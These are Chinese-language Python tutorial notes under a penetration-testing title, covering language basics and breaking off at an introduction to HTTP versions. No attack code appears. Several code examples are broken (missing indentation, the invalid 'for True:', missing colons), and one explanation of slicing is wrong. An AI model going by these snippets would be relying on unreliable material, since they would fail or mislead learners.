# **Python**编写渗透测试⼯具

## **第⼀节** **Python**介绍与安装

### **配置**Anaconda

新建⼀个`pentest`的Python虚拟环境

安装`requests`和`scrapy`两个库

```cmd
#初始化conda
conda init

#显示当前所有的Python虚拟环境
conda info --env

#切换到pentest环境
conda activate pentest

#执⾏Python命令，进⼊Python编辑命令⾏
python

#打印Hello world！
print("Hello world!")
```

### Hello world

```python
if __name__ == '__main__':
    print("Hello World!")
```



## **第⼆节** **Python**数据结构

### **⼀、字⾯量**

字⾯量：在代码中，被写下来的固定的值，称之为字⾯量。

![image-20240812170903309](https://image.201068.xyz/assets/21.Python/image-20240812170903309.png)

> `type()` 查看变量存储的数据类型

### **⼆、注释**

- 单⾏注释：以#开头，#右边的所有⽂字当做说明，⽽不是真正要执⾏的代码，起辅助说明作⽤。
- 多⾏注释：以⼀对3个双引号引起来

```python
# 我是单⾏注释

"""
 我是多⾏注释
"""

print("Hello World!")
```

### **三、数据类型转换**

![image-20240812171107698](https://image.201068.xyz/assets/21.Python/image-20240812171107698.png)

```python
int_str = "12"
print(int(int_str))
float_str = "12.5"
print(float(float_str))
num = 12
print(str(num))
```

### **四、标识符**

标识符（变量名）：是⽤户在编程的时候所使⽤的⼀系列名字，⽤于变量、类、⽅法等命名

标识符命名中，只允许出现：英⽂、中⽂、数字、下划线(_)这四类元素

注意：不推荐使⽤中⽂，数字不可以开头，且不可使⽤关键字

### **五、运算符**

算术（数学）运算符：

![image-20240812171159747](https://image.201068.xyz/assets/21.Python/image-20240812171159747.png)

### **六、字符串**

#### **1.****字符串的三种定义**

单引号定义法，双引号定义法，三个单引号定义法。

其中，单引号定义法可以内含双引号，双引号定义法可以内含单引号，并且可以使⽤转义字符(\)来将引号解除效⽤，变成普通字符串。

```python
t_str = "my name is \"bingbing\""
print(t_str)
multi_row_str = '''
 我们的祖国是花园，
 花园的花朵真鲜艳
'''
print(multi_row_str)
```

#### **2.****字符串拼接**

```
s1 = "Hello"
s2 = "world"
print(s1 + " " + s2)
```

注意：字符串和⾮字符串变量进⾏拼接，需要进⾏类型转换。

默认print语句输出的内容会⾃动换⾏，在print语句中，加上end=""即可输出不换⾏。

```
print(s1 + " " + s2, end="")
```

#### **3.****字符串格式化**

占位符，通过如下语法，完成字符串和变量的快速拼接

![image-20240812171355339](https://image.201068.xyz/assets/21.Python/image-20240812171355339.png)

如下代码，完成字符串、整数、浮点数三种不同类型变量的占位

```python
name = "冰冰"
years_old = 18
height = 175.8
print("我是%s，我的年龄是%d，我的身⾼是%f" % (name, years_old, height))
```

其中，`%`表示占位符，且在⽆需使⽤变量进⾏数据存储的时候，可以直接格式化表达式（变量的位置放⼊表达式），简化代码。



#### **4.****格式化的精度控制**

我们可以使⽤辅助符号"m.n"来控制数据的宽度和精度。

`m`，控制宽度，要求是数字，如果设置的宽度⼩于数字⾃身，则不⽣效。

`.n`，控制⼩数点精度，要求是数字，会进⾏⼩数的四舍五⼊。

示例： `%5d`：表示将整数的宽度控制在5位，如数字11，就会变成：[空格][空格][空格]11，⽤三个空格补⾜宽度。

`%5.2f`：表示将宽度控制为5，将⼩数点精度设置为2 。⼩数点和⼩数部分也算⼊宽度计算。

如，对11.345设置了`%7.2f` 后，结果是`[空格][空格]11.35`。2个空格补⾜宽度，⼩数部分限制2位精度后，四舍五⼊为 `.35`

`%.2f`：表示不限制宽度，只设置⼩数点精度为2，

如11.345设置`%.2f`后，结果是11.35

```python
print("我是浮点数：%.2f" % 11.345 )
#有bug
```

#### **5.**字符串快速格式化

通过语法：`f"内容{变量}"`的格式来快速格式化

```python
print(f"我是{name}，我的年龄是{years_old}，我的身⾼是{height}")
```

这种写法不做精度控制，不理会类型。

### **七、数据输⼊**

使⽤`input()`语句可以从键盘获取输⼊

```python
name = input("请告诉我你是谁：")
print("Oh My God!!!你是%s" % name )
```

注意：⽆论键盘输⼊什么类型的数据，获取到的数据永远都是字符串类型

### 练习

```python
# 单行注释

"""
多行注释
"""

num = 12
# int
print(type(num))

# str
print(type(str(num)))
print(str(num))

# bool
print(bool(num))

# 元组
my_tuple = (1, 2, 3, 4, 5)
print("my_tuple:", my_tuple)

# 集合
my_set = {1, 2, 3, 4, 5}
print("my_set:", my_set)
print(type(my_set))

# 列表
my_list = [1, 2, 3, 4, 5]

# 列表转换为元组
my_tuple = tuple(my_list)
print("my_tuple:", my_tuple)

# 字典
my_dict = {"name": "John", "age": 30, "city": "New York"}
print("my_dict:", my_dict)
print("my_dict['name']:", my_dict['name'])

# 多行字符串
string = '''
print(num)
print(type(num))
'''
print(string)
print(type(string))

```



```python
a=1
b=2
#加
c=a+b
print(c)

#乘
d=a*b
print(d)

#除
e=a/b
print(e)

#减
f=a-b
print(f)

#幂
g=a**b
print(g)

#取整
h=a//b
print(h)

#取余
i=a%b
print(i)

#字符串
str = "my name is \"bingbing\""
print(str)

#多行字符串
multi_row_str = '''
 我们的祖国是花园，
 花园的花朵真鲜艳
'''
print(multi_row_str)

str1="hello world"
str2="hello world"
#字符串拼接
print(str1+str2)
#字符串重复
print(str1*3)

#字符串输出,不换行
print(str1+str2,end="")

name = "泡泡"
old = 18
height = 175.8
print("我是%s，我的年龄是%d，我的身⾼是%.1f" % (name, old, height))
print(("我是{name}，我的年龄是{old}，我的身⾼是{height}").format(name=name, old=old, height=height))
print(f"我是{name}，我的年龄是{old}，我的身⾼是{height}")
print("我是浮点数：%6.2f" % 11.345 )

# name = input("你是谁：")
# print("Oh My God!!!你是%s" % name )

a=1
# a=input("请输入数字：")
```



## **第三节** **Python**流程控制语句

### **⼀、**if语句

#### **1.if**语句基本格式

```python
if 判断条件:
 执⾏语句1
else:
 执⾏语句2
```

当满⾜判断条件时，也就是判断条件为True，则执⾏语句1，当不满⾜判断条件时，也就是判断条件为False，则执⾏语句2。

归属于if判断的代码语句块，需要在前⽅填充4个空格缩进，Python通过缩进判断代码块的归属关系。

```python
my_height = 170
bb_height = 175.8
if my_height > bb_height:
print("I Love You!")
else:
print("T_T~")
```

#### **2.if**、elif**、**else语句

```python
if 判断条件1:
 执⾏语句1
elif 判断条件2:
 执⾏语句2
else:
 执⾏语句3
```

当满⾜判断条件1时，也就是判断条件1为True，则执⾏语句1，当不满⾜判断条件1时，也就是判断条件1为False，

但是满⾜判断条件2时，也就是判断条件2为True，则执⾏语句2。以上条件都不满⾜时，则执⾏语句3。

```python
print("欢迎来到⽹安世纪⼤学")
score = int(input("请输⼊你的成绩(整数)："))
if 100 >= score >= 80:
print("你太优秀了")
elif 80 > score >= 60:
print("你还⾏")
else:
print("请继续努⼒")
```

### **⼆、循环语句**

#### **1.while**循环

```python
while 条件:
	执⾏语句
```

在while循环语句中，当条件为True时，它会⼀直反复循环⾥⾯的执⾏语句，通常称为死循环。为了防⽌程序出现死循环这种情况，需要在while语句的代码块⾥加⼊停⽌条件，例如：

```python
while 循环条件:
	执⾏语句
	if 停⽌条件:
		循环条件=False
		
#或者是
while 循环条件:
	执⾏语句
	if 停⽌条件:
		break
```

举例

```python
i = 1
while i > 0:
print("6", end="")
i = i + 1
if i > 100:
break
```

#### **2.for**循环

```python
for 字符 in 字符串:
 执⾏语句
for 数字 range 数字串:
 执⾏语句
```

for循环与while循环不同的⼀点就是，它可以从⼀个列表或者字符串或者数字⾥⾯取出每⼀个元素，这个while是做不到的，例如：

```python
name = "bingbing"
for i in name:
		print(i)
		
for i in range(10):
	print(i)
	
for True:
	print("6")
```

#### **3.range**语句

⽤于获得⼀个数字序列

##### 语法1：

```
range(num）
```

从0开始，到num结束（不含num本身）

##### 语法2：

```
range(num1, num2)
```

从num1开始，到num2结束（不含num2本身）

##### 语法3：

```
range(num1, num2, step)
```

从num1开始，到num2结束，间隔step个数（不含num2本身）

```
for i in range(10):
	print(i)
```

#### **4.break和continue的区别**

在程序的流程控制语句中，break和continue是两个⽤于控制循环的关键字，它们的主要区别在于：

##### break：

- 作⽤：⽤于⽴即终⽌当前循环结构的后续所有操作。
- 使⽤场景：当需要在循环中退出到循环体外时使⽤。
- 影响：执⾏break后，循环会⽴即结束，不再执⾏后续的循环体代码。

##### continue：

- 作⽤：⽤于结束本次循环，并开始下⼀次循环。
- 使⽤场景：当需要在循环中跳过当前迭代，直接进⼊下⼀次迭代时使⽤。
- 影响：执⾏continue后，本次循环剩余的语句会被跳过，但不会影响整个循环的执⾏。

### 练习

```python
if a==1:
    print("1=1")
elif a==2:
    print("1=2")
else:
    print("1=3")
```



```python
num = 20
int = 0

# while循环
while int < 20:
    if int % 2 == 0:
        print(int)
        int = int + 1
        continue
    print(int)
    int = int + 1

# for循环
for i in range(20):
    if i % 2 == 0:
        print("偶数：", i)
        continue
    print("奇数：", i)

# 步长
for i in range(0, 20, 3):
    print(i)

for i in range(20, 0, -1):
    print(i)

# 字符串
for i in "helloworld":
    print(i)
    if i == "o":
        continue
    if i == "l":
        break

# 九九乘法表
i = 1
while i < 10:
    j = 1
    while j < i + 1:
        if j == i:
            print(f'{j} * {i} ={i * j}\t')
        else:
            print(f'{j} * {i} ={i * j}\t', end=" ")
        # print(f'{j} * {i} ={i*j}',end="\t")
        j += 1
    # print()
    i += 1

for i in range(1, 10):
    for j in range(1, i + 1):
        print(f'{j} * {i} ={i * j}', end="\t")
    print()

a = 1
while a in range(1, 10):
    b = 1
    while b in range(1, a + 1):
        print(f'{b} * {a} ={a * b}', end="\t")
        b += 1
    print()
    a += 1

```



## **第四节** **Python**数据容器

⼀种可以容纳多份数据的数据类型，容纳的每⼀份数据称之为1个元素。每个元素可以是任意类型的数据。

### ⼀、列表list

#### 基本语法：

```
#字⾯量
[元素1, 元素2, 元素3, 元素4, ...]

#定义变量
变量名称 = [元素1, 元素2, 元素3, 元素4, ...]

#定义空列表
变量名称 = []
变量名称 = list()
```

#### 列表的⽅法：

![image-20240812173152250](https://image.201068.xyz/assets/21.Python/image-20240812173152250.png)

#### 列表的特点：

- 可以容纳多个数据（上限为(2**63)-1，9223372036854775807个）
- 可以容纳不同类型的数据（混装）
- 数据是有序存储的（有下标序号）
- 允许重复数据存在
- 可以修改（增加或删除元素等）

#### 练习

```python
list = [1, 2, 3]

# append
list.append(4)
print("添加元素：",list)  # [1, 2, 3, 4]

# extend
list.extend([5, 6])
print("添加多个元素：",list)   #  [1, 2, 3, 4, 5, 6]

# insert
list.insert(2, 'a')
print("插入元素a：", list)    # [1, 2, 'a', 3, 4, 5, 6]

# remove
list.remove('a')
print("删除元素a：", list)    #  [1, 2, 3, 4, 5, 6]

# pop
pop = list.pop()
print("删除最后一个元素：", pop) # 6
print("pop删除后的列表",list)  # [1, 2, 3, 4, 5]

# del
del list[0]
print("删除第一位的元素：", list)    # [2, 3, 4, 5]

# index
print("查看元素的位置：", list.index(3)) # 1

# count
print("统计元素3出现的次数：",list.count(3)) # 1

#len
print("查看列表长度：", len(list)) # 4

# clear
list.clear()
print("清空列表：", list)  # []
```

### **⼆、元组**tuple

#### 基本语法：

```python
#定义元组字⾯量
(元素, 元素, ......, 元素)

#定义元组变量
变量名称 = (元素, 元素, ......, 元素)

#定义空元组
变量名称 = ()
变量名称 = tuple()
```

注意：元组只有⼀个数据，这个数据后⾯要加逗号

#### 元组的⽅法：

![image-20240812173405191](https://image.201068.xyz/assets/21.Python/image-20240812173405191.png)

#### 元组的特点：

1.不可以修改元组的内容，否则会直接报错

```python
#尝试修改元组内容
t1 = (1,2,3)
t1[0] = 5
print(t1)

#输出结果
Traceback (most recent call last):
File "variables_test.py", line 77, in <module>
t1[0] = 5
~~^^^
TypeError: 'tuple' object does not support item assignment
```

2.可以修改元组内的list的内容（修改元素、增加、删除等）

```python
t1 = (1,2, ['hello', 'world'])
t1[2][1] = "best"
print(t1)

#输出结果
(1, 2, ['hello', 'best'])
```



#### 练习

```python
tuple = (1, 2, 3, 2, 4)

# count
print("统计元素2的次数：",tuple.count(2))  # 2

# index
print("元素3的位置",tuple.index(3))  #  2

# len
print("查看元组长度：", len(tuple)) # 5
```



### **三、字符串**str

#### 字符串的⽅法：

![image-20240812173545206](https://image.201068.xyz/assets/21.Python/image-20240812173545206.png)

#### 字符串的特点：

1. 1.字符串容器可以容纳的类型是单⼀的，只能是字符串类型
2. 2.字符串不可以修改，如果必须要修改，只能得到⼀个新的字符串，旧的字符串是⽆法修改的。

#### 练习

```python
str = " Hello World! "

# 获取3位置的字符
print("获取3位置的字符：",str[3]) # l

# index
print("第⼀次出现的下标：",str.index("World")) # 7

# replace
print("替换：",str.replace("Hello", "Hi"))  #  Hi World!

# strip
print("去掉字符串两端的空白字符：",str.strip())  # Hello World!

# split
print("字符串分割：",str.split(" ")) # ['', 'Hello', 'World!', '']

# count
print("统计l字符出现的次数：",str.count("l")) # 3

# len
print("查看字符串长度：", len(str)) # 14
```



### **四、序列的切⽚**

#### 序列

序列是内容**连续、有序、可使⽤下标索引**的⼀类数据容器。

**列表**、**元组**、**字符串**都可以视为序列。

#### 语法：

```python
序列[起始下标 : 结束下标 : 步⻓]
```

表示从序列中，从指定位置开始，依次取出元素，到指定位置结束，得到⼀个新的序列。

- 起始下标表示从何处开始，可以留空，留空视作截取到结尾
- 结束下标（不含）表示从何处结束，可以留空，留空视作截取到结尾
- 步⻓表示依次取元素的间隔，步⻓为**负数**表示**反向取**（注意，起始下标和结束下标也要反向标记）

```python
#实践
#从下标1开始，到下标4（不含）结束，步⻓默认是1
my_list = [1,2,3,4,5,6,7,8,9]
new_list = my_list[1:4]
print(new_list)

#输出结果
[2, 3, 4]
```



```python
#从头开始，到最后结束，步⻓为1
my_tuple = (1,2,3,4,5,6,7,8,9)
new_tuple = my_tuple[:]
print(new_tuple) # (1, 2, 3, 4, 5, 6, 7, 8, 9)

#从头开始，到下标4（不含）结束，步⻓2
my_str = "hello world"
new_str = my_str[:4:2]
print(new_str) # hl

#反转字符串
my_str = "hello world"
new_str = my_str[len(my_str) -1 : : -1]
print(new_str) # dlrow olleh
```

#### 练习

```python
my_list = [1, 2, 3, 4, 5, 6, 7, 8, 9]

# 从下标1开始，到下标4（不含）结束，步⻓默认是1
new_list = my_list[1:4]
print("从下标1到下标4结束，步⻓为1：", new_list)

# 从头开始，到最后结束，步⻓为1
my_tuple = (1, 2, 3, 4, 5, 6, 7, 8, 9)
new_tuple = my_tuple[:]
print("从头开始，到最后结束，步⻓为1：", new_tuple)  # 输出结果(1, 2, 3, 4, 5, 6, 7, 8, 9)

# 从头开始，到下标4（不含）结束，步⻓2
my_str = "hello world"
new_str = my_str[:4:2]
print("从头开始，到下标4（不含）结束，步⻓2：", new_str)  # 输出结果   hl

# 反转字符串
my_str = "hello world"
new_str = my_str[len(my_str) - 1:: -1]
print("反转字符串：", new_str)  # 输出结果   dlrow olleh
```



### **五、集合**set

#### 基本语法：

```python
#定义集合字⾯量
{元素, 元素, ......, 元素}

#定义集合变量
变量名称 = {元素, 元素, ......, 元素}

#定义空集合
变量名称 = set()
```

#### 集合的⽅法：

![image-20240813085940004](https://image.201068.xyz/assets/21.Python/image-20240813085940004.png)

#### 集合特点：

相较于列表、元组、字符串来说，不⽀持元素的重复（⾃带**去重**功能），并且内容**⽆序**。

#### 练习

```python
# 创建两个集合
set1 = {1, 2, 3, 4, 5}
set2 = {4, 5, 6, 7, 8}

# 添加一个元素到 set1
set1.add(6)
print("添加后 set1:", set1)	#添加后 set1: {1, 2, 3, 4, 5, 6}

# 从 set1 中移除一个元素
set1.remove(2)
print("移除后 set1:", set1)	#移除后 set1: {1, 3, 4, 5, 6}

# 从 set1 中随机移除并返回一个元素
popped_element = set1.pop()
print("pop 出的元素:", popped_element) #pop 出的元素: 1
print("pop 后 set1:", set1)	#pop 后 set1: {3, 4, 5, 6}

# 清空 set1
set1.clear()
print("清空后 set1:", set1)	#清空后 set1: set()

# 计算 set1 和 set2 的差集
difference_set = set1.difference(set2)
print("set1 和 set2 的差集:", difference_set)	#set1 和 set2 的差集: set()

# 更新 set1 为与 set2 的差集
set1.difference_update(set2)
print("更新后的 set1 (差集):", set1)	#更新后的 set1 (差集): set()

# 计算 set1 和 set2 的并集
union_set = set1.union(set2)
print("set1 和 set2 的并集:", union_set)	#set1 和 set2 的并集: {4, 5, 6, 7, 8}

# 输出集合 set2 的长度
length_of_set2 = len(set2)
print("set2 的长度:", length_of_set2)	#set2 的长度: 5
```



### **六、字典**dict

#### 字典定义：

```python
#定义字典字⾯量
{key:value, key:value, ......, key:value}

#定义字典变量
变量名称 = {key:value, key:value, ......, key:value}

#定义空字典
变量名称 = {}
变量名称 = dict()
```

#### 字典的常⽤操作：

![image-20240813090218891](https://image.201068.xyz/assets/21.Python/image-20240813090218891.png)

#### 字典的特点：

- 键值对的Key和Value可以是任意类型（Key不可为字典）
- 字典内Key不允许重复，重复添加等同于覆盖原有数据
- 字典不可⽤下标索引，⽽是通过Key检索Value

#### 练习

```python
# 创建一个字典
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}

# 获取字典中的值
value = my_dict['apple']
print("apple 的值:", value)	# apple 的值: 1

# 修改字典中的值
my_dict['apple'] = 4
print("修改后的字典:", my_dict)	#修改后的字典: {'apple': 4, 'banana': 2, 'orange': 3}

# 删除字典中的键值对
popped_value = my_dict.pop('banana')
print("删除的值:", popped_value)	#删除的值: 2
print("删除后字典:", my_dict)	#删除后字典: {'apple': 4, 'orange': 3}

# 清空字典
my_dict.clear()
print("清空后的字典:", my_dict) #清空后的字典: {}


# 重新填充字典
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}

# 获取字典中的所有键
keys = my_dict.keys()
print("字典的键:", keys) #字典的键: dict_keys(['apple', 'banana', 'orange'])

# 获取字典的长度
length = len(my_dict)
print("字典的长度:", length)	#字典的长度: 3
```



### **七、数据容器的通⽤操作**

#### 数据容器特点对⽐：

![image-20240813090555164](https://image.201068.xyz/assets/21.Python/image-20240813090555164.png)

#### 容器通⽤功能：

![image-20240813090629080](https://image.201068.xyz/assets/21.Python/image-20240813090629080.png)

#### 练习

```python
# 创建一些容器
numbers = [1, 3, 5, 7, 9, 2, 4, 6, 8, 0]  # 列表
text = "Hello, world!"  # 字符串
mixed_tuple = (1, 2, 3, "a", "b", "c")  # 元组

# 使用 for 循环遍历列表
print("遍历列表:")
for number in numbers:
    print(number, end=' ')
print()	
'''
遍历列表:
1 3 5 7 9 2 4 6 8 0 
'''

# 使用 max() 和 min() 获取最大值和最小值
max_number = max(numbers)
min_number = min(numbers)
print("最大值:", max_number) #最大值: 9
print("最小值:", min_number) #最小值: 0

# 获取容器的长度
length_numbers = len(numbers)
print("列表长度:", length_numbers)	#列表长度: 10

# 容器之间的转换
numbers_as_string = str(numbers)
print("列表转字符串:", numbers_as_string) #列表转字符串: [1, 3, 5, 7, 9, 2, 4, 6, 8, 0]
numbers_as_tuple = tuple(numbers)
print("列表转元组:", numbers_as_tuple) #列表转元组: (1, 3, 5, 7, 9, 2, 4, 6, 8, 0)
numbers_as_set = set(numbers)
print("列表转集合:", numbers_as_set) #列表转集合: {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}

# 排序
sorted_numbers = sorted(numbers)
print("排序后的列表:", sorted_numbers)	#排序后的列表: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

# 反向排序
reverse_sorted_numbers = sorted(numbers, reverse=True)
print("反向排序后的列表:", reverse_sorted_numbers) #反向排序后的列表: [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]

# 使用 for 循环遍历字符串
print("遍历字符串:")
for char in text:
    print(char, end='')
print()
'''
遍历字符串:
Hello, world!
'''

# 使用 for 循环遍历元组
print("遍历元组:")
for item in mixed_tuple:
    print(item, end=' ')
print()
'''
遍历元组:
1 2 3 a b c 
'''
```



## **第五节** **Python**函数及函数调⽤

函数是组织好的，可重复使⽤的，⽤来实现单⼀，或相关联功能的代码段。

函数能提⾼应⽤的模块性，和代码的重复利⽤率。Python提供了许多内建函数，⽐如print()。我们也可以⾃⼰创建

函数，这被叫做⽤户⾃定义函数。

### **⼀、定义⼀个函数**

我们可以定义⼀个由⾃⼰想要功能的函数，以下是简单的规则：

- 函数代码块以 `def` 关键词开头，后接函数标识符名称和圆括号`()`。
- 任何传⼊参数和⾃变量必须放在圆括号中间。圆括号之间可以⽤于定义参数。
- 函数的第⼀⾏语句可以选择性地使⽤⽂档字符串—⽤于存放函数说明。
- 函数内容以**冒号**起始，并且缩进。
- `return [表达式/返回值]` 结束函数，选择性地返回⼀个值给调⽤⽅。不带表达式或返回值的return相当于返回None。

函数的语法：

```python
def 函数名(传⼊参数):
  函数体
  return 返回值
```

注意：如果函数没有使⽤return语句返回数据，会返回None这个字⾯量；在if判断中，None等同于False；定义变量，但暂时不需要变量有具体值，可以⽤None来代替

### **⼆、函数返回值**

#### **1.**单返回值

```python
def single_retrun():
  x = 10
  return x

x = single_retrun()
print(x)
```

#### **2.**多返回值

```python
def multi_retrun():
  x = 10
  y = 20
  return x, y

(x, y) = multi_retrun()
print(x)
print(y)
```

### **三、函数多种传参⽅式**

#### **1.**位置参数

调⽤函数时根据函数定义的参数位置来传递参数，传递的参数和定义的参数的顺序及个数必须⼀致

```python
def user_info(name, age, gender):
    print(f"您的名字是{name}，年龄是{age}，性别是{gender}")
user_info("冰冰", 20, "⼥")
```

#### **2.**关键字参数

函数调⽤时通过”`键=值`“形式传递参数。

```python
def user_info(name, age, gender):
	print(f"您的名字是{name}，年龄是{age}，性别是{gender}")
	
#关键字参数
user_info(name="冰冰", age=20, gender="⼥")

#可以不按照固定顺序
user_info(age=20, gender="⼥", name="冰冰")

#可以和位置参数混⽤，位置参数必须在前，且匹配参数顺序
user_info("冰冰", age=20, gender="⼥")
```

#### **3.**缺省参数

缺省参数也叫默认参数，⽤于定义函数，为参数提供默认值，调⽤函数时可不传该默认参数的值（注意：**所有位置参数必须出现在默认参数前**，包括函数定义和调⽤）

```python
def user_info(name, age, gender="男"):
	print(f"您的名字是{name}，年龄是{age}，性别是{gender}")
    
user_info("杰克", 45)
```

函数调⽤时，如果为缺省参数传值则修改默认参数值, 否则使⽤这个默认值。

#### **4.**不定⻓参数

不定⻓参数也叫可变参数. ⽤于不确定调⽤的时候会传递多少个参数(不传参也可以)的场景.

##### 不定⻓参数的类型: 

- ①位置传递 
- ②关键字传递

##### **(1)**位置传递

> `*args` 元组类型

```python
def user_info(*args):
	print(args)
user_info("冰冰")
user_info("冰冰", 20)

'''
('冰冰',)
('冰冰', 20)
'''
```

传进的所有参数都会被args变量收集，它会根据传进参数的位置合并为⼀个**元组**(tuple)，**args是元组类型**，这就是位置传递。

##### **(2)**关键字传递

> `**kwargs `字典

```python
def user_info(**kwargs):
	print(kwargs)
user_info(name="冰冰", age=20, gender="⼥")

'''
{'name': '冰冰', 'age': 20, 'gender': '⼥'}
'''
```

参数是“`键=值`”形式的形式的情况下, 所有的“键=值”都会被`kwargs`接受, 同时会根据“键=值”组成**字典**。

## **第六节** **Python**⽂件操作

### **⼀、打开⽂件**

#### 语句结构：

```python
open(⽂件名, mode)
```

#### mode常⽤的三种基础访问模式：

![image-20240813091448979](https://image.201068.xyz/assets/21.Python/image-20240813091448979.png)

### **⼆、⽂件读取**

#### ⽂件读取的常⽤⽅法：

![image-20240813091523279](https://image.201068.xyz/assets/21.Python/image-20240813091523279.png)

通常我们使⽤`with open() as f` 的⽅法去操作⽂件，这个⽅法就是不必在⽂件操作完之后关闭⽂件流。

```python
with open("test.txt", "r") as f:
	line_list = f.readlines()
	print(line_list)    # ['hello\n', 'world\n', 'good\n', 'good\n', 'study\n', 'day\n', 'day\n', 'up\n']
```

### **三、⽂件写⼊**

#### ⽂件写⼊的常⽤⽅法：

![image-20240813091730655](https://image.201068.xyz/assets/21.Python/image-20240813091730655.png)

⼀般常⽤`write()`⽅法，例如：

```python
f = open("test.txt", "a", encoding="utf-8")
f.write("这是最后⼀⾏")
f.close()

with open("test.txt", "r", encoding="utf-8") as f:
    line_list = f.readlines()
    print(line_list)  # ['hello\n', 'world\n', 'good\n', 'good\n', 'study\n', 'day\n', 'day\n', 'up\n', '这是最后⼀⾏']
    
f = open("test.txt", "a", encoding="utf-8")
f.writelines(" ")
f.flush()
f.close()
```

## **第七节** **Python**异常、模块与包

### **⼀、异常捕获**

在可能发⽣异常的地⽅，进⾏捕获。当异常出现的时候，提供解决⽅式，⽽不是任由其导致程序⽆法运⾏。

#### 语法结构：

```python
try:
 可能要发⽣异常的语句
except[异常 as 别名:]
 出现异常的准备⼿段
[else:]
 未出现异常时应做的事情
[finally:]
 不管出不出现异常都会做的事情
```

异常的种类多种多样，如果想要不管什么类型的异常都能捕获到，那么使⽤：`except Exception as e:`

#### 练习

```python
#加法
def add(a, b):
    return a + b

#减法
def sub(a, b):
    return a - b

#乘法
def mul(a, b):
    return a * b

#除法
def div(a, b):
    try:
        return a / b
    except:
        print("错误，除数不能为0！")


def first():
    print("欢迎使用计算器！")

    try:

        num1 = float(input("请输入第一个数字: "))
        symbol = input("请输入操作符 (+, -, *, /): ")
        num2 = float(input("请输入第二个数字: "))

        if symbol == '+':
            value = add(num1, num2)
        elif symbol == '-':
            value = sub(num1, num2)
        elif symbol == '*':
            value = mul(num1, num2)
        elif symbol == '/':
            value = div(num1, num2)
        else:
            value = "无效的操作符！"

        print(num1,symbol,num2,"=",value)
    except ValueError as e:
        print("请输入数字！")

if __name__ == '__main__':
     first()
```



### **⼆、模块**

**模块**(`Module`)，是⼀个 Python **⽂件**，以 `.py` 结尾. 模块能定义**函数，类和变量**，模块⾥也能包含**可执⾏的代码**。

#### 模块导⼊⽅式：

```python
[from 模块名] import [模块 | 类 | 变量 | 函数 | *] [as 别名]
```

#### 常⽤的组合形式如：

> import 模块名
>
> from 模块名 import 类、变量、⽅法等
>
> from 模块名 import *
>
> import 模块名 as 别名
>
> from 模块名 import 功能名 as 别名

#### ⾃定义模块：

每个Python⽂件都可以作为⼀个模块，模块的名字就是⽂件的名字。

在实际开发中，当⼀个开发⼈员编写完⼀个模块后，为了让模块能够在项⽬中达到想要的效果， 这个开发⼈员会⾃⾏在py⽂件中添加⼀些测试信息，但是在模块导⼊的时候都会⾃动执⾏ test 函数的调⽤

#### 解决⽅案：

```python
def test(a, b)
 print(a+b)
 
#只在当前⽂件中调⽤该函数，其他导⼊的⽂件内不符合该条件，则不执⾏test()函数调⽤
if __name__ == '__main__'
 test(1, 2)
```

如果⼀个模块⽂件中有 `_ _all_ _` 变量，当使⽤ `from xxx import *` 导⼊时，只能导⼊这个列表中的元素

操作示例，新建PythonStudy项⽬，在项⽬下添加两个⽬录`ch1`和`ch2`

在ch1⽬录下，创建python⽂件studyFunction.py，在⽂件中新建⼀个函数`value_add()`

```python
def value_add(a, b):
	return a + b
```

在ch2⽬录下，创建python⽂件`import_test.py`，在⽂件中导⼊刚刚ch1中python⽂件创建的函数`value_add`

```python
from ch1.studyFunction import value_add
```

然后调⽤value_add函数，并传⼊必要参数

```python
v = value_add(2,3)
print(v)
```

### **三、包**

从物理上看，包就是⼀个**⽂件夹**，在该⽂件夹下⾃动创建了⼀个 `__init__.py` ⽂件，该⽂件夹可⽤于包含多个模块⽂件。 

从逻辑上看，包的本质依然是**模块**。

当我们的模块⽂件越来越多时，包可以帮助我们管理这些模块，包的作⽤就是包含多个模块，但包的本质依然是模块。

#### 导⼊包：

1. `import 包名.模块名` 调⽤：**包名.模块名.⽬标**；
2. `from 包名 import *` 必须在 `__init__.py` ⽂件中添加 `__all__ = []` ，控制允许导⼊的模块列表；

## **第⼋节** **Python Web**漏洞检测

### **⼀、**HTTP协议介绍

![image-20240813092728386](https://image.201068.xyz/assets/21.Python/image-20240813092728386.png)

#### **1.**协议分类

HTTP协议是⼀直不断发展的，发展的过程中，出现了以下三个分类，分别是：

- `HTTP1.0` 80端⼝，
- `HTTP1.1` 80端⼝，
- `HTTPS` 443端⼝，

下⾯就对三种不同分类进⾏介绍。

##### **（1）HTTP1.0**

HTTP1.0是最早开发出来的协议版本，默认使⽤的是80端⼝进⾏监听。要注意的是这⾥80端⼝是服务端的，⽽不是

客户端的。客户端在发送请求时，使⽤的端⼝是随机的，未被占⽤的端⼝。

HTTP1.0最主要的特点就是：每⼀次请求都要与⽬标服务器进⾏⼀次连接，才能进⾏请求和响应。这样就浪费了⽹

络带宽的资源。为了弥补这样的缺点，就开发了HTTP1.1协议。

##### **（2）HTTP1.1**

在HTTP1.1协议中，要对某⼀个⽬标站点进⾏多次访问，如果使⽤HTTP1.1协议的话，那么，多次访问都使⽤的是

同⼀个链接，⽽不是多次建⽴链接。这也是HTTP1.1与HTTP1.0主要的⼀个区别。但是，这两个版本也会存在⼀些

问题，最主要的问题集中于HTTP1.0和HTTP1.1它们的协议是不安全的。之所以协议不安全的，是因为整个数据在

⽹络的传输过程中都是以明⽂发送的。数据不经过加密就在⽹络信道中进⾏通信，这时候很可能被截获。截获之

后，直接查看明⽂数据包，就可以发现其中的⼀些机密信息。

⽐如说浏览器（⽤户）在请求某个登录⻚⾯的链接，其中包含了⽤户的登录名和密码，如果被截获，直接就可以获

得该⽤户的登录令牌，这时候截获信息的恶意⼈员就可以直接使⽤该⽤户名和密码进⾏登录⽬标系统。由此可以想

到，不加密是⾮常危险的⽹络⾏为。出现这样问题之后，HTTP⼜在发展中开发出来HTTPS。

##### **（3）HTTPS**

HTTPS是⼀个加密的协议，主要是对传输的数据进⾏加密，如果这时候数据被截获，是⽆法直接或者短时间解密出

对应的明⽂数据，这在⼀定程度上保护了数据的安全性。

HTTP1.0和HTTP1.1在服务端都是监听的80端⼝，⽽HTTPS则在服务端默认监听的是443端⼝，这⾥⼀定要注意。

那么对于HTTP协议来说，它通过请求和响应的模式来进⾏数据交互，下⾯就对它的请求⽅法进⾏介绍。

#### **2.请求⽅法**

